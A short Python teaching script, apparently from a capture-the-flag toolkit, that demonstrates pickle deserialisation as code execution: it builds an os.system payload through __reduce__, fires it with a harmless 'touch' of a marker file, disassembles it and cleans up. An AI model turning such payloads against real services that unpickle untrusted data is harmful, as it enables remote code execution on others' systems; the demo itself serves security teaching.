#!/usr/bin/env python3
"""pickle is code execution: the ``__reduce__`` protocol.

``pickle.loads`` on attacker data is arbitrary code execution. When the
unpickler rebuilds an object it calls whatever ``__reduce__`` returns: a
callable and its arguments. :func:`ctfkit.web.pickle_rce` packages the classic
``os.system`` demonstration; here we point it at a harmless local command and
watch it fire on load.
"""
import os
import pickle
import pickletools

from ctfkit.web import pickle_rce

# A marker inside a scratch dir next to this script (cleaned up at the end).
scratch = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".rce_demo")
os.makedirs(scratch, exist_ok=True)
marker = os.path.join(scratch, "proof")
payload = pickle_rce(f"touch {marker}")

print("marker exists before load:", os.path.exists(marker))
pickle.loads(payload)  # <-- this RUNS os.system during deserialisation
print("marker exists after load: ", os.path.exists(marker))

print("--- pickletools.dis of the payload ---")
pickletools.dis(payload)

# clean up the proof marker + scratch dir
os.remove(marker)
os.rmdir(scratch)
